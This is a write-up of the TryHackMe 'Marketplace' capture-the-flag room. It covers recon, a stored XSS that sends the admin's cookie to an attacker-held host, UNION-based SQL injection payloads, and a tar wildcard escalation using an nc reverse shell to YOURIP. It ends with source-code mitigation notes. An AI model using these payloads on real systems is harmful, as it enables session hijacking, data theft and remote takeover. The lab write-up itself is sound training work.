---
author: NotCare
pubDatetime: 2023-07-27T01:18:00Z
title: THM: Marketplace Writeup
postSlug: thm-marketplace-writeup
featured: true
draft: false
tags:
  - writeup
  - thm
ogImage: ""
description: Marketplace is a place to add your listing with different functionalities, what could go wrong?
---

## Abstract

Marketplace is a place to add your listing with different functionalities, like add your product, contact the author, report the listing to the admins and a lot more techniques and POCs for XSS and SQL Injection with source code analysis, Lets dive in!<br>
THM marketplace: [Marketplace](https://tryhackme.com/room/marketplace)<br>
Level: Medium

## Recon

As always, we'll start off with nmap as our initial reconn to see which ports are open

```bash
nmap -sC -sV -oN marketplace.nmap 10.10.7.63
```

here we see three ports open and a disallowed entry to robots.txt, its important to gather as much as information as we can such as Tech stack or framework used and things along the line, with this in mind, we can see its made in `Express`

## Enumeration

Let's check the website
*[Image: homepage]*
Checking admin page we see that were not authorized to see the page<br>
Running `gobuster` to bruteforce directories we get,
*[Image: gobuster]*
Upon signing up to the website we can add a new listing, let's quickly test for xss with a simple payload ``
*[Image: xss]*

and we can confirm its vulnerable to xss
*[Image: xsspoc]*
okay now how can we leverage this? hmm, since theres no other interesting routes to look at so our next step would be to check cookies, looking at the cookie we know its a jwt token since its delimited by three `.`s which follows the format of `Header.Payload.Signature`, you can check the JWT token in an online tool<br>
We can try changing the `"admin"` to `"true"` and pasting the generated token in cookie but we get no results, bummer, because we dont know the `userId` of admin so its a deadend

#### Steal admin cookie

But if we check our listing page, we can see theres two option `Contact the listing author` and `Report listing to admins`, the latter is interesting because what if we can somehow manipulate xss and then report our listing to the admin so that we can steal his cookie and well yeah you guessed it login with that,so we craft an exploit  
reference:[Payload and explaination](https://infosecgirls.gitbook.io/infosecgirls-training/v/appsec/web-application-pentesting/a7-cross-site-scripting/advanced-xss-sending-data-to-remote-server) it explains well.<br>
`<script>document.location="http://YOURIP:8001/?"+document.cookie</script>`
then we spun up a `python3 -m http.server 8000` so that if we get a hit, we can get the cookie. You can create a new listing and paste the steal cookie payload to see if its working and you should get an hit to your python server
*[Image: testtoken]*
now we need to somehow report this listing to the admin and since were changing the path in our exploit we cant really do that in our browser, so burpsuite helps us in this. What we do is report a normal listing capture is through bursuite and change the report id to our listing id.
lets do that
*[Image: burp]*
when we hit and yess we get a hit
*[Image: python]*
we can verify this from our jwt tool we mentioned earlier
*[Image: jwt]*
and suprisingly micheal with userid 2 is the admin, lets paste this token in the cookie to get the admin access

## Initial foothold

We get our first flag under /admin! Now if we check the users page we see that is a GET parameter `?user=1` and its pulling from the database so lets try SQL injection with our initial payload `' or 1=1 -- -` and we can see that it errored out so definitely something weird going on here
*[Image: sqli]*

whenever you an error, you must try different payload by starting to change something small to see what happens and work your way around it.
now if we remove the `'` we execute properly and see the result lets try UNION injection starting with UNION SELECT 1,2 and so on
*[Image: union]*
so finally UNION SELECT 1,2,3,4 results good
*[Image: noerror]*

our next step would be enumuering the database with the following payload, now here if we do it with a valid user id it doesnt show us anything so we gotta change the user id to something that doesnt exist.
Lets enumuerate the database

- get database<br>
  `admin?user=0 union select 1,database(),3,4 -- `: shows marketplace()<br>
- show tables in marketplace

```js
UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) ,3,4 fRoM information_schema.tables wHeRe table_schema='marketplace' -- -
```

<br>
- select messages
```js
union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -
```
*[Image: messagetable]*

- get message_content and user_from

```js
user=0 union select 1,group_concat(message_content,user_to),3,4 from marketplace.messages-- -
```

*[Image: table]*

and we get our ssh password for user 3 now we just gotta go back and check whos user three and its jake

and we get our user.txt
*[Image: user]*

## Privesc

running linpeas on the box we see an interesting directory which is in `/opt/backup`
checking the backup.sh file we see its backing up the files using tar and wildcard `*`
and wildcild is exploitable so lets craft the exploit

*[Image: jake]*

#### Horizontal privesc

lets privesc horizontally to get michael since the wildcard operator is exploitable we can go to gtfobins for the payload

```bash
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP 4242 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

then we can execute the payload but we get permission denied so we do `chmod 777` on backup.tar and shell.sh
*[Image: michael]*
for some reason i messed that one up soo i tried again
*[Image: michael]*
and we got a hit
we must stabilize the shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`
now if we do id on michael we see were in docker container so gtfobins says

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

we get root!
*[Image: root]*

## Beyond root

now, lets not just stop at root.txt and try to understand where and how we got the SQLI injeciton in the first place, and its important to dive deep into the source code as well to get a in depth understanding of the architecture and code flow

### Source code analysis

if we go to `/home/marketplace/the-marketplace`, we can analyze the code

- /new listing
  this is where we first got our XSS POC looking at the code we can see its taking unsanitized input in the `obj` from `req.body.description`, which means were trusting the user input.

```js
router.post("/new", (req, res, next) => {
  if (!req.loggedIn)
    return res.status(403).render("error", {
      error: "Not logged in",
    });
  if (req.body.title && req.body.description) {
    let obj = {
      title: req.body.title,
      description: req.body.description,
      author: req.user.userId,
      image: "598815c0f5554115631a3250e5db1719",
    };

    db.query(`INSERT INTO items SET ?`, obj, (err, results, fields) => {
      if (err) {
        console.error(err);
        return res
          .status(500)
          .send("An error occurred while adding a new listing");
      }

      return res.redirect("/item/" + results.insertId);
    });
  } else {
    return res.send(400);
  }
});
```

- Mitigation
  Always have zero-trust ground and always sanitize user input, have a blacklist filter.

- /item/[id]
  This is where we see the reflected XSS POC, and as we can see its fetching the item from the database with the userid and itemid and passing it to `items` which gets to the `res.render()` function and blindly renders the `item`

```js
router.get("/item/:id", function (req, res, next) {
  const id = parseInt(req.params.id) * 1;

  if (isNaN(id)) {
    return res.status(404).render("error", {
      error: "Item not found",
    });
  }
  db.query(
    `SELECT users.username, items.* FROM items                                                                                                                                                                                      
  LEFT JOIN users ON items.author = users.id WHERE items.id = ${id}`,
    (err, items, fields) => {
      console.log(err);
      if (items && items[0]) {
        const item = items[0];
        res.render("item", {
          title: "Item | The Marketplace",
          item,
        });
        console.log(item);
      } else {
        return res.status(404).render("error", {
          error: "Item not found",
        });
      }
    }
  );
});
```

- mitigation
  Same as above, only when the user inputs the data, always sanitize

- SQLI injection
  /admin listing is vulnerable to SQLI injection, as we can see were using `req.query.user` to get the param and without any proper sanitation were directly inserting that to the database query which results in our UNION injection

```js
router.get("/admin", (req, res, next) => {
  if (!req.loggedIn || !req.user.admin)
    return res.status(403).render("error", {
      error: "You are not authorized to view this page!",
    });
  if (req.query.user) {
    db.query(
      "SELECT * FROM users WHERE id = " + req.query.user,
      (error, items, fields) => {
        if (error) {
          return res.status(500).render("error", {
            error,
          });
        }
        return res.render("adminUser", {
          title: `User ${items[0].id}`,
          user: items[0],
        });
      }
    );
  } else {
    db.query("SELECT * FROM users", (err, items, fields) => {
      if (err) {
        return res.status(500).render("error", {
          error: "An error occurred getting user list",
        });
      }
      return res.render("adminPanel", {
        title: "User listing",
        users: items,
      });
    });
  }
});
```

- Mitigation: Use parameterized statements.<br>

## References

- JWT Tool: https://jwt.io/introduction
- Owasp Cheatsheet: https://cheatsheetseries.owasp.org/cheatsheets
- Parametarized query: https://techcommunity.microsoft.com/t5/sql-server-blog/how-and-why-to-use-parameterized-queries/ba-p/383483
  <br>Thanks for reading!
